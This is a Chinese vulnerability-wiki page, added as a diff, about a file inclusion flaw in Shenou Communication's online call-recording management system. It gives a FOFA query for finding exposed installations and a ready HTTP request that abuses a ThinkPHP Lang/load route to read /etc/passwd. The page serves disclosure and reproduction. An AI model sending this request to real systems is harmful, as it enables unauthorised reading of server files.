@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E7%94%B3%E7%93%AF%E9%80%9A%E4%BF%A1%E8%AE%BE%E5%A4%87%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8/%E7%94%B3%E7%93%AF%E9%80%9A%E4%BF%A1%E8%AE%BE%E5%A4%87%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8%E5%9C%A8%E7%BA%BF%E5%BD%95%E9%9F%B3%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9Findex%E5%AD%98%E5%9C%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>申瓯通信设备有限公司在线录音管理系统index存在文件包含漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "\u7533\u74ef\u901a\u4fe1\u8bbe\u5907\u6709\u9650\u516c\u53f8\u5728\u7ebf\u5f55\u97f3\u7ba1\u7406\u7cfb\u7edfindex\u5b58\u5728\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e", url: "#_top", children: [
+          ]},
+          {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1", children: [
+          ]},
+          {title: "\u4e8c\u3001\u5f71\u54cd\u7248\u672c", url: "#_2", children: [
+          ]},
+          {title: "\u4e09\u3001\u8d44\u4ea7\u6d4b\u7ed8", url: "#_3", children: [
+          ]},
+          {title: "\u56db\u3001\u6f0f\u6d1e\u590d\u73b0", url: "#_4", children: [
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../%E7%94%B3%E7%93%AF%E9%80%9A%E4%BF%A1%E8%AE%BE%E5%A4%87%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8%E5%9C%A8%E7%BA%BF%E5%BD%95%E9%9F%B3%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../%E7%94%B3%E7%93%AF%E9%80%9A%E4%BF%A1%E8%AE%BE%E5%A4%87%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8%E5%9C%A8%E7%BA%BF%E5%BD%95%E9%9F%B3%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        申瓯通信设备有限公司在线录音管理系统存在任意文件下载漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../%E7%94%B3%E7%93%AF%E9%80%9A%E4%BF%A1%E5%9C%A8%E7%BA%BF%E5%BD%95%E9%9F%B3%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/%E7%94%B3%E7%93%AF%E9%80%9A%E4%BF%A1%E5%9C%A8%E7%BA%BF%E5%BD%95%E9%9F%B3%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9Fdownload%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../%E7%94%B3%E7%93%AF%E9%80%9A%E4%BF%A1%E5%9C%A8%E7%BA%BF%E5%BD%95%E9%9F%B3%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/%E7%94%B3%E7%93%AF%E9%80%9A%E4%BF%A1%E5%9C%A8%E7%BA%BF%E5%BD%95%E9%9F%B3%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9Fdownload%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        申瓯通信在线录音管理系统download任意文件读取漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="index">申瓯通信设备有限公司在线录音管理系统index存在文件包含漏洞<a class="headerlink" href="#index" title="Permanent link">&para;</a></h1>
+<h1 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h1>
+<p>申瓯通信设备有限公司在线录音管理系统系统是一款全面的企业管理软件，涵盖多个领域，助力企业实现信息化管理和业务优化。申瓯通信设备有限公司在线录音管理系统index存在文件包含漏洞。</p>
+<h1 id="_2">二、影响版本<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h1>
+<ul>
+<li>在线录音管理系统</li>
+</ul>
+<h1 id="_3">三、资产测绘<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h1>
+<ul>
+<li>fofa<code>title="在线录音管理系统"&lt;font style="color:rgb(221, 17, 68);"&gt;&lt;/font&gt;</code></li>
+</ul>
+<p><img alt="1718298593944-67a12797-71e8-44ee-8755-020482502e3d.png" src="./img/S_cYMDLU99OSGVbJ/1718298593944-67a12797-71e8-44ee-8755-020482502e3d-126112.png" /></p>
+<h1 id="_4">四、漏洞复现<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h1>
+<div class="highlight"><pre><span></span><code><span class="n">GET</span><span class="w"> </span><span class="o">/</span><span class="n">callcenter</span><span class="o">/</span><span class="kd">public</span><span class="o">/</span><span class="n">index</span><span class="p">.</span><span class="na">php</span><span class="o">?</span><span class="n">s</span><span class="o">=</span><span class="n">index</span><span class="o">/</span><span class="err">\</span><span class="n">think</span><span class="err">\</span><span class="n">Lang</span><span class="o">/</span><span class="n">load</span><span class="o">&amp;</span><span class="n">file</span><span class="o">=/</span><span class="n">etc</span><span class="o">/</span><span class="n">passwd</span><span class="w"> </span><span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
+<span class="n">User</span><span class="o">-</span><span class="n">Agent</span><span class="p">:</span><span class="w"> </span><span class="n">Mozilla</span><span class="o">/</span><span class="mf">5.0</span><span class="w"> </span><span class="p">(</span><span class="n">Macintosh</span><span class="p">;</span><span class="w"> </span><span class="n">Intel</span><span class="w"> </span><span class="n">Mac</span><span class="w"> </span><span class="n">OS</span><span class="w"> </span><span class="n">X</span><span class="w"> </span><span class="mi">10_15_0</span><span class="p">)</span><span class="w"> </span><span class="n">AppleWebKit</span><span class="o">/</span><span class="mf">537.36</span><span class="w"> </span><span class="p">(</span><span class="n">KHTML</span><span class="p">,</span><span class="w"> </span><span class="n">like</span><span class="w"> </span><span class="n">Gecko</span><span class="p">)</span><span class="w"> </span><span class="n">Chrome</span><span class="o">/</span><span class="mf">77.0.3865.90</span><span class="w"> </span><span class="n">Safari</span><span class="o">/</span><span class="mf">537.36</span>
+<span class="n">Cache</span><span class="o">-</span><span class="n">Control</span><span class="p">:</span><span class="w"> </span><span class="n">no</span><span class="o">-</span><span class="n">cache</span>
+<span class="nl">Pragma</span><span class="p">:</span><span class="w"> </span><span class="n">no</span><span class="o">-</span><span class="n">cache</span>
+<span class="nl">Host</span><span class="p">:</span><span class="w"> </span>
+<span class="nl">Accept</span><span class="p">:</span><span class="w"> </span><span class="n">text</span><span class="o">/</span><span class="n">html</span><span class="p">,</span><span class="w"> </span><span class="n">image</span><span class="o">/</span><span class="n">gif</span><span class="p">,</span><span class="w"> </span><span class="n">image</span><span class="o">/</span><span class="n">jpeg</span><span class="p">,</span><span class="w"> </span><span class="o">*</span><span class="p">;</span><span class="w"> </span><span class="n">q</span><span class="o">=</span><span class="mf">.2</span><span class="p">,</span><span class="w"> </span><span class="o">*/*</span><span class="p">;</span><span class="w"> </span><span class="n">q</span><span class="o">=</span><span class="mf">.2</span>
+<span class="nl">Connection</span><span class="p">:</span><span class="w"> </span><span class="n">close</span>
+</code></pre></div>
+<p><img alt="1718714151400-95020a2d-915f-4d12-b219-daf747b492c3.png" src="./img/S_cYMDLU99OSGVbJ/1718714151400-95020a2d-915f-4d12-b219-daf747b492c3-939244.png" /></p>
+<blockquote>
+<p>更新: 2024-06-23 23:42:49<br />
+原文: <a href="https://www.yuque.com/xiaokp7/ocvun2/zdcq09yhyllgqpdn">https://www.yuque.com/xiaokp7/ocvun2/zdcq09yhyllgqpdn</a></p>
+</blockquote>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../%E7%94%B3%E7%93%AF%E9%80%9A%E4%BF%A1%E8%AE%BE%E5%A4%87%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8%E5%9C%A8%E7%BA%BF%E5%BD%95%E9%9F%B3%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../%E7%94%B3%E7%93%AF%E9%80%9A%E4%BF%A1%E8%AE%BE%E5%A4%87%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8%E5%9C%A8%E7%BA%BF%E5%BD%95%E9%9F%B3%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        申瓯通信设备有限公司在线录音管理系统存在任意文件下载漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../%E7%94%B3%E7%93%AF%E9%80%9A%E4%BF%A1%E5%9C%A8%E7%BA%BF%E5%BD%95%E9%9F%B3%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/%E7%94%B3%E7%93%AF%E9%80%9A%E4%BF%A1%E5%9C%A8%E7%BA%BF%E5%BD%95%E9%9F%B3%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9Fdownload%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../%E7%94%B3%E7%93%AF%E9%80%9A%E4%BF%A1%E5%9C%A8%E7%BA%BF%E5%BD%95%E9%9F%B3%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/%E7%94%B3%E7%93%AF%E9%80%9A%E4%BF%A1%E5%9C%A8%E7%BA%BF%E5%BD%95%E9%9F%B3%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9Fdownload%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        申瓯通信在线录音管理系统download任意文件读取漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
